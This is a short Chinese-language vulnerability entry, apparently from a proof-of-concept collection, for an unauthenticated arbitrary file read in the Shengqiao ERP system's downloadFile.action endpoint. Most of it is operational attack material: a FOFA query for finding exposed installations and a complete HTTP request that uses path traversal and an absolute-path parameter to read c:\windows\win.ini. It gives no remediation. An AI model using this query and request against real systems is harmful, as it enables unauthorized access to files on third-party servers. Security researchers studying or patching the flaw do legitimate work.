# 圣乔ERP系统downloadFile.action任意文件读取漏洞

圣乔ERP系统 downloadFile.action 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件。

## fofa
```javascript
app="圣乔-ERP系统"
```

## poc
```javascript
GET /erp/wap/../downloadFile.action?absolutePath=true&file=c:\\windows\win.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20241219152120711](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412191521762.png)